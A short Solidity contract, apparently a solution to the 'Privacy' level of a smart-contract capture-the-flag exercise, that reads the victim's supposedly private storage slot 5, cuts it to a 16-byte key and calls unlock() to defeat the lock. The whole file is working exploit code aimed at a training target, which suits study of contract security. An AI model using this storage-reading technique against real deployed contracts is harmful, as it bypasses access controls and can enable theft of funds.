import "src/Privacy/Privacy.sol";
import "exploits/BlockUtils.sol";

contract PrivacyExploit is BlockUtils {

    Privacy victim;

    constructor(address _victim) {
        victim = Privacy(payable(_victim));
    }

    function hack() public {
        // Read data[2] from storage slot 5
        bytes32 data2 = peekStorage(address(victim), 5);
        bytes16 key = bytes16(data2); // Take the first 16 bytes
        victim.unlock(key);
    }

    receive() external payable {
    }
}